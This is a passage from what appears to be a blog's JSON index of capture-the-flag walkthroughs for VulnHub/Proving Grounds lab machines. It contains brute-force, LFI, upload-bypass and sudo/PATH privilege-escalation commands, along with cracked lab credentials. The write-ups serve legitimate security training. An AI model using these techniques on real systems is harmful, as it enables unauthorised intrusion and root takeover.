>>![Untitled](/Vulnhub-Files/img/Pxexp/Untitled.png)```bashIP : 192.168.249.139```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Pxexp/Untitled.png)```bashIP : 192.168.249.139```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/pyexp]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.139Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 11:44 EDTNmap scan report for 192.168.249.139Host is up (0.00080s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION1337/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)| 256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)|_ 256 8d11edff7dc5a72499227fce2988b24a (ED25519)3306/tcp open mysql MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1| mysql-info: | Protocol: 10| Version: 5.5.5-10.3.23-MariaDB-0+deb10u1| Thread ID: 47| Capabilities flags: 63486| Some Capabilities: SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, Speaks41ProtocolOld, LongColumnFlag, SupportsLoadDataLocal, InteractiveClient, ODBCClient, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults| Status: Autocommit| Salt: {qEC`:@p7`]|_ Auth Plugin Name: mysql_native_passwordMAC Address: 00:0C:29:26:C6:0F (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## MySQL Enumeration â¤µï¸Lets try hydra for mysql login with user as root â†’```bashhydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.249.139 -t 4```{: .nolineno}![Untitled](/Vulnhub-Files/img/Pxexp/Untitled%201.png)Got credentials as â†’```bashroot : prettywoman```{: .nolineno}![Untitled](/Vulnhub-Files/img/Pxexp/Untitled%202.png)Now lets dig deeper â†’```bashMariaDB [(none)]> use data;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [data]> show tables;+----------------+| Tables_in_data |+----------------+| fernet |+----------------+1 row in set (0.001 sec)MariaDB [data]> select * from fernet \\G ;*************************** 1. row ***************************cred: gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=keyy: UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=1 row in set (0.001 sec)ERROR: No query specifiedMariaDB [data]>```{: .nolineno}Now I searched for fernet decode and I got this site â†’[https://asecuritysite.com/tokens/ferdecode](https://asecuritysite.com/tokens/ferdecode)![Untitled](/Vulnhub-Files/img/Pxexp/Untitled%203.png)```bashcredentials ->lucy : wJ9`\"Lemdv9[FEw-```{: .nolineno}![Untitled](/Vulnhub-Files/img/Pxexp/Untitled%204.png)Now lets find path to root â†’```bashlucy@pyexp:~$ lucy@pyexp:~$ sudo -lMatching Defaults entries for lucy on pyexp: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser lucy may run the following commands on pyexp: (root) NOPASSWD: /usr/bin/python2 /opt/exp.pylucy@pyexp:~$ sudo -u root /usr/bin/python2 /opt/exp.pyhow are you?import os; os.system(\"/bin/sh\")# exitlucy@pyexp:~$ sudo -u root /usr/bin/python2 /opt/exp.pyhow are you?import os; os.system(\"/bin/bash\"); root@pyexp:/home/lucy# whoamirootroot@pyexp:/home/lucy# iduid=0(root) gid=0(root) groups=0(root)root@pyexp:/home/lucy# cd ~root@pyexp:~# ls -altotal 32drwx------ 3 root root 4096 Aug 10 2020 .drwxr-xr-x 18 root root 4096 Aug 10 2020 ..-rw------- 1 root root 5 Aug 10 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Aug 10 2020 .local-rw------- 1 root root 2731 Aug 10 2020 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Aug 10 2020 root.txtroot@pyexp:~# cat root.txta7a7e80ff4920ff06f049012700c99a8root@pyexp:~#root@pyexp:/home/lucy# lsuser.txtroot@pyexp:/home/lucy# cat user.txt8ca196f62e91847f07f8043b499bd9beroot@pyexp:/home/lucy#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Pwned", "url": "/posts/Pwned/", "categories": "Proving Grounds, Play", "tags": "Docker Exploit, FTP, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [Pwned](https://www.vulnhub.com/entry/pwned-1,507/) â¤µï¸- VM name : Pwned- Difficulty : Easy- DHCP : Enabled- Goal : 3 flagsThis works better with VirtualBox rather than VMwar...", "content": "## **Description â¤µï¸**>ðŸ’¡ [Pwned](https://www.vulnhub.com/entry/pwned-1,507/) â¤µï¸- VM name : Pwned- Difficulty : Easy- DHCP : Enabled- Goal : 3 flagsThis works better with VirtualBox rather than VMware{: .prompt-tip }### Letâ€™s find the IP Address first >>![176-1.png](/Vulnhub-Files/img/Pwned/176-1.png)```bashIP : 10.0.2.28```{: .nolineno}## Port Scan Results âž¡ï¸![176-2.png](/Vulnhub-Files/img/Pwned/176-2.png)![176-3.png](/Vulnhub-Files/img/Pwned/176-3.png)```bashOPEN PORTS >21 FTP22 SSH80 HTTP```{: .nolineno}---## Web Enumeration â¤µï¸![176-4.png](/Vulnhub-Files/img/Pwned/176-4.png)Source code â¤µï¸ ![176-5.png](/Vulnhub-Files/img/Pwned/176-5.png)![176-6.png](/Vulnhub-Files/img/Pwned/176-6.png)![176-7.png](/Vulnhub-Files/img/Pwned/176-7.png)![176-8.png](/Vulnhub-Files/img/Pwned/176-8.png)Lets deal with this login page â†’![176-9.png](/Vulnhub-Files/img/Pwned/176-9.png)```bashftpuser : B0ss_B!TcH```{: .nolineno}---## FTP Enumeartion â¤µï¸Now logging in with that credentials â†’![176-10.png](/Vulnhub-Files/img/Pwned/176-10.png)![176-11.png](/Vulnhub-Files/img/Pwned/176-11.png)![176-12.png](/Vulnhub-Files/img/Pwned/176-12.png)With this lets have a shell now â†’---## SHELL â¤µï¸![176-13.png](/Vulnhub-Files/img/Pwned/176-13.png)![176-14.png](/Vulnhub-Files/img/Pwned/176-14.png)![176-15.png](/Vulnhub-Files/img/Pwned/176-15.png)Now lets check `sudo -l` command â†’![176-16.png](/Vulnhub-Files/img/Pwned/176-16.png)while executing **`sudo -u selena ./home/messanger.sh`**![176-17.png](/Vulnhub-Files/img/Pwned/176-17.png)![176-18.png](/Vulnhub-Files/img/Pwned/176-18.png)![176-19.png](/Vulnhub-Files/img/Pwned/176-19.png)![176-20.png](/Vulnhub-Files/img/Pwned/176-20.png)Lets try docker command for root access â†’![176-21.png](/Vulnhub-Files/img/Pwned/176-21.png)Now lets try this docker payload â†’![176-22.png](/Vulnhub-Files/img/Pwned/176-22.png)![176-23.png](/Vulnhub-Files/img/Pwned/176-23.png)Now I got it â†’![176-24.png](/Vulnhub-Files/img/Pwned/176-24.png)![176-25.png](/Vulnhub-Files/img/Pwned/176-25.png)> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "PwnLab", "url": "/posts/PwnLab/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc, mysql", "date": "2023-06-14 00:00:00 +0530", "snippet": "Letâ€™s Find the Victim Machines IP Address â¤µï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled.png)```bashIP : 10.0.2.33```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/PwnLab/Unti...", "content": "Letâ€™s Find the Victim Machines IP Address â¤µï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled.png)```bashIP : 10.0.2.33```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/pwnlab]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.33Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 16:06 ISTNmap scan report for 10.0.2.33Host is up (0.0016s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-title: PwnLab Intranet Image Hosting|_http-server-header: Apache/2.4.10 (Debian)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 34509/tcp6 status| 100024 1 45792/udp status| 100024 1 51759/udp6 status|_ 100024 1 51803/tcp status3306/tcp open mysql MySQL 5.5.47-0+deb8u1| mysql-info: | Protocol: 10| Version: 5.5.47-0+deb8u1| Thread ID: 41| Capabilities flags: 63487| Some Capabilities: LongPassword, Support41Auth, InteractiveClient, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, FoundRows, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SupportsCompression, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: 0%h[rJYb_9=egVY:X*gH|_ Auth Plugin Name: mysql_native_password51803/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:EF:BA:B4 (Oracle VirtualBox virtual NIC)```{: .nolineno}## Web Enumeration â¬‡ï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%202.png)Now lets try to access config.php file as I found while directory listing For that I need to use the `php://filter` command >>```bashhttp://10.0.2.33/?page=php://filter/convert.base64-encode/resource=config```{: .nolineno}![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%203.png)I got this âž¡ï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%204.png)```php```{: .nolineno}Now I got the sql access >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%205.png)![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%206.png)```sql+------+--------------------------------+| user | pass > base64 decoded |+------+--------------------------------+| kent | Sld6WHVCSkpOeQ== > JWzXuBJJNy || mike | U0lmZHNURW42SQ== > SIfdsTEn6I || kane | aVN2NVltMkdSbw== > iSv5Ym2GRo |+------+--------------------------------+```{: .nolineno}So with kent credentials I got logged in â€”>But I can also se the index.php file like config so letâ€™s see >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%207.png)![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%208.png)Now I see so I can use lang as a input for cookies so letâ€™s try something â€”> ![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%209.png)Now lets try to upload our reverse shell payload , but I was unable upload the .php file so I made some changed while uploading the payload â¤µï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2010.png)1. I changed the file name and added `.gif`2. I changed the `Content-Type:` from `application/x-php` to `image/gif`.3. Then I added the magic number of gif file as `GIF89a;` to make it look like gif file .4. In response I got the upload location .Now lets access the file as we accessed `/etc/passwd` file >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2011.png)![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2012.png)I got the Local Privilege shell So lets exploit it further now âž¡ï¸So while enumerating I got this >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2013.png)So in this case `msgmike` executes cat command to read the following file and it also contains the SUID permissions for mike to provide a executable shell .therefore I need to make `cat` as `bin/bash` and it will be executed by `msgmike` .![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2014.png)![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2015.png)Lets see what it does >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2016.png)Now the simple thing to do >>![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2017.png)canâ€™t use cat because of the $PATH thatâ€™s why I used more here â¬‡ï¸![Untitled](/Vulnhub-Files/img/PwnLab/Untitled%2018.png)> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Potato", "url": "/posts/Potato/", "categories": "Proving Grounds, Play", "tags": "LFI, NoSQLi, PrivEsc, Recon, hashcat", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address of the victim Machine â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled.png)```bashIP : 10.0.2.58```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Download...", "content": "### Lets check the IP address of the victim Machine â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled.png)```bashIP : 10.0.2.58```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/potato]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.58 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 10:49 ISTNmap scan report for 10.0.2.58Host is up (0.00060s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ef240eabd2b316b44b2e27c05f48798b (RSA)| 256 f2d8353f4959858507e6a20e657a8c4b (ECDSA)|_ 256 0b2389c3c026d5645e93b7baf5147f3e (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Potato company|_http-server-header: Apache/2.4.41 (Ubuntu)2112/tcp open ftp ProFTPD| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 901 Aug 2 2020 index.php.bak|_-rw-r--r-- 1 ftp ftp 54 Aug 2 2020 welcome.msgMAC Address: 08:00:27:14:E4:AF (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/potato]â””â”€$ ftp 10.0.2.58 2112Connected to 10.0.2.58.220 ProFTPD Server (Debian) [::ffff:10.0.2.58]Name (10.0.2.58:kali): anonymous331 Anonymous login ok, send your complete email address as your passwordPassword: 230-Welcome, archive user anonymous@10.0.2.27 !230-230-The local time is: Mon May 29 05:21:38 2023230-230 Anonymous access granted, restrictions applyRemote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||39163|)150 Opening ASCII mode data connection for file listdrwxr-xr-x 2 ftp ftp 4096 Aug 2 2020 .drwxr-xr-x 2 ftp ftp 4096 Aug 2 2020 ..-rw-r--r-- 1 ftp ftp 901 Aug 2 2020 index.php.bak-rw-r--r-- 1 ftp ftp 54 Aug 2 2020 welcome.msg226 Transfer completeftp> ftp> get index.php.baklocal: index.php.bak remote: index.php.bak229 Entering Extended Passive Mode (|||58047|)150 Opening BINARY mode data connection for index.php.bak (901 bytes) 901 33.51 KiB/s 226 Transfer complete901 bytes received in 00:00 (20.70 KiB/s)ftp> get welcome.msglocal: welcome.msg remote: welcome.msg229 Entering Extended Passive Mode (|||54100|)150 Opening BINARY mode data connection for welcome.msg (54 bytes) 54 994.98 KiB/s 226 Transfer complete54 bytes received in 00:00 (20.66 KiB/s)ftp>```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Potato/Untitled%201.png)Now I got a login page â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%202.png)Lets use the credentials from `index.php.bak` file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/potato]â””â”€$ cat index.php.bak Go to the dashboard\"; setcookie('pass', $pass, time() + 365*24*3600); }else{ echo \"Bad login/password! Return to the login page \"; } exit();}?> Login User: Password: ```{: .nolineno}And lets also see the content of `welcome.msg` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/potato]â””â”€$ cat welcome.msg Welcome, archive user %U@%R !The local time is: %T```{: .nolineno}Now I tried the nosql-injection method for login and I got this â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%203.png)Now after clicking on dashboard I got this page â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%204.png)Now I have access for and LFI execution so lets try some thing â€”>while accessing `Logs` option I got this â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%205.png)Now lets try to access `/etc/passwd` file â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%206.png)I got this interstingly â†’```bashwebadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash```{: .nolineno}Now with hashcat lets crack this password â†’I also used for hash identified `name the hash tool` â†’which gives me different values for different tools for cracking this hash â†’![Untitled](/Vulnhub-Files/img/Potato/Untitled%207.png) Now I used `hashcat tool` â†’```bashhashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt```{: .nolineno}![Untitled](/Vulnhub-Files/img/Potato/Untitled%208.png)Lets login into it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/potato]â””â”€$ ssh webadmin@10.0.2.58The authenticity of host '10.0.2.58 (10.0.2.58)' can not be established.ED25519 key fingerprint is SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.58' (ED25519) to the list of known hosts.webadmin@10.0.2.58 is password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 29 May 2023 06:38:47 AM UTC System load: 0.08 Processes: 125 Usage of /: 14.9% of 31.37GB Users logged in: 0 Memory usage: 48% IPv4 address for enp0s3: 10.0.2.58 Swap usage: 0%61 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sun Aug 2 19:56:20 2020 from 192.168.1.11webadmin@serv:~$ whoamiwebadminwebadmin@serv:~$ iduid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)webadmin@serv:~$ uname -anLinux serv 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linuxwebadmin@serv:~$webadmin@serv:~$ ls -altotal 32drwxr-xr-x 3 webadmin webadmin 4096 Aug 2 2020 .drwxr-xr-x 4 root root 4096 Aug 2 2020 ..-rw------- 1 webadmin webadmin 357 Aug 2 2020 .bash_history-rw-r--r-- 1 webadmin webadmin 220 Aug 2 2020 .bash_logout-rw-r--r-- 1 webadmin webadmin 3771 Aug 2 2020 .bashrcdrwx------ 2 webadmin webadmin 4096 Aug 2 2020 .cache-rw-r--r-- 1 webadmin webadmin 807 Aug 2 2020 .profile-rw------- 1 webadmin root 69 Aug 2 2020 user.txtwebadmin@serv:~$ cat user.txtTGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmUgwebadmin@serv:~$```{: .nolineno}Now lets see what can webadmin user can do â†’```bashwebadmin@serv:/$ sudo -lMatching Defaults entries for webadmin on serv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser webadmin may run the following commands on serv: (ALL : ALL) /bin/nice /notes/*```{: .nolineno}Lets try to access `id.sh` file which is inside the notes directory â†’```bashwebadmin@serv:/$ sudo /bin/nice /notes/id.shuid=0(root) gid=0(root) groups=0(root)```{: .nolineno}Now I have not access to modify this file so lets create a file in /tmp folder named as `shell.sh` which contains normal bash calling command â†’ ***`/bin/bash -i`*** ```bashwebadmin@serv:/tmp$ nano shell.shwebadmin@serv:/tmp$ chmod +x shell.sh webadmin@serv:/tmp$ cd ../webadmin@serv:/$ sudo /bin/nice /notes/../tmp/shell.shroot@serv:/# whoamirootroot@serv:/# iduid=0(root) gid=0(root) groups=0(root)root@serv:/# pwd/root@serv:/#root@serv:/# cd ~root@serv:~# ls -altotal 36drwx------ 5 root root 4096 Aug 2 2020 .drwxr-xr-x 21 root root 4096 Aug 2 2020 ..-rw------- 1 root root 73 Aug 2 2020 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Aug 2 2020 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw------- 1 root root 89 Aug 2 2020 root.txtdrwxr-xr-x 3 root root 4096 Aug 2 2020 snapdrwx------ 2 root root 4096 Aug 2 2020 .sshroot@serv:~# cat root.txtbGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==root@serv:~#```{: .nolineno}If I connect both user.txt and root.txt file I get this â†’```bashLe contrÃ´le est Ã  peu prÃ¨s aussi rÃ©el quâ€™unelicorne unijambiste qui fuit au bout dâ€™un double arc-en-ciel.After Traslation ->Control is about as real as a one-legged unicorn fleeing at the end of a double rainbow.```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "NullByte", "url": "/posts/NullByte/", "categories": "Proving Grounds, Play", "tags": "Exiftool, Password BruteForce, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled.png)```bashIP : 10.0.2.32```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitl...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled.png)```bashIP : 10.0.2.32```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/NullByte]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.32[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 09:44 ISTNmap scan report for 10.0.2.32Host is up (0.0053s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http?|_http-title: Null Byte 00 - level 1111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 44254/tcp6 status| 100024 1 56237/udp status| 100024 1 57300/tcp status|_ 100024 1 59382/udp6 status777/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 1024 163013d9d55536e81bb7d9ba552fd744 (DSA)| 2048 29aa7d2e608ba6a1c2bd7cc8bd3cf4f2 (RSA)| 256 6006e3648f8a6fa7745a8b3fe1249396 (ECDSA)|_ 256 bcf7448d796a194876a3e24492dc13a2 (ED25519)57300/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:5C:97:BB (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitled%202.png)Now when I downloaded this â¬†ï¸ eye image I recon over it through exiftool and I found this >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled%203.png)Now When I used this string as a web Directory I got this >> ![Untitled](/Vulnhub-Files/img/NullByte/Untitled%204.png)Source Code â¬‡ï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitled%205.png)Now I have to brute-force the keys to get the exact one >>```bashsudo hydra 10.0.2.32 http-form-post \"/kzMb5nVYJw/index.php:key=^PASS^:invalid key\" -P /usr/share/wordlists/rockyou.txt -la```{: .nolineno}![Untitled](/Vulnhub-Files/img/NullByte/Untitled%206.png)After Entering this >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled%207.png)I think this data processing workes from mysql so letâ€™s try sqlmap now >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled%208.png)```sqlDatabase: sethTable: users[2 entries]+----+---------------------------------------------+--------+------------+| id | pass | user | position |+----+---------------------------------------------+--------+------------+| 1 | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | || 2 | --not allowed-- | isis | employee |+----+---------------------------------------------+--------+------------+```{: .nolineno}Lets crack this password >>![Untitled](/Vulnhub-Files/img/NullByte/Untitled%209.png)![Untitled](/Vulnhub-Files/img/NullByte/Untitled%2010.png)```bashCredentials >>ramses : omega```{: .nolineno}Lets SSH now â¤µï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitled%2011.png)![Untitled](/Vulnhub-Files/img/NullByte/Untitled%2012.png)Now I think ps command is executed here os lets run sh instead of ps on procwatch file â†’So I have to change the Environment variable and include /tmp so that it can execute the sh directory which is copied in tmp directory â†’![Untitled](/Vulnhub-Files/img/NullByte/Untitled%2013.png)Now letâ€™s run `./procwatch` â¬‡ï¸![Untitled](/Vulnhub-Files/img/NullByte/Untitled%2014.png)```bash# cat proof.txtadf11c7a9e6523e630aaf3b9b7acb51dIt seems that you have pwned the box, congrats. Now you done that I wanna talk with you. Write a walk & mail atxly0n@sigaint.org attach the walk and proof.txtIf sigaint.org is down you may mail at nbsly0n@gmail.comUSE THIS PGP PUBLIC KEY-----BEGIN PGP PUBLIC KEY BLOCK-----Version: BCPG C# v1.6.1.0mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJQ3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFTe4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprqCu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNeYcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwuY29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNSHhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7qm7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGnXQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HUGms==PiAQ-----END PGP PUBLIC KEY BLOCK-----# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000 link/ether 08:00:27:5c:97:bb brd ff:ff:ff:ff:ff:ff inet 10.0.2.32/24 brd 10.0.2.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::a00:27ff:fe5c:97bb/64 scope link valid_lft forever preferred_lft forever# id uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "NoName", "url": "/posts/NoName/", "categories": "Proving Grounds, Play", "tags": "Command Injection, PrivEsc, SUIDs, Steghide, find", "date": "2023-06-14 00:00:00 +0530", "snippet": ">This machine crashes alot so frustrating Machine â†’{: .prompt-danger }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/NoName/Untitled.png)```bashIP : 10.0.2.57```{: .nolineno}#...", "content": ">This machine crashes alot so frustrating Machine â†’{: .prompt-danger }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/NoName/Untitled.png)```bashIP : 10.0.2.57```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Noname]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.57 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 15:54 ISTNmap scan report for 10.0.2.57Host is up (0.0023s latency).Not shown: 65534 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 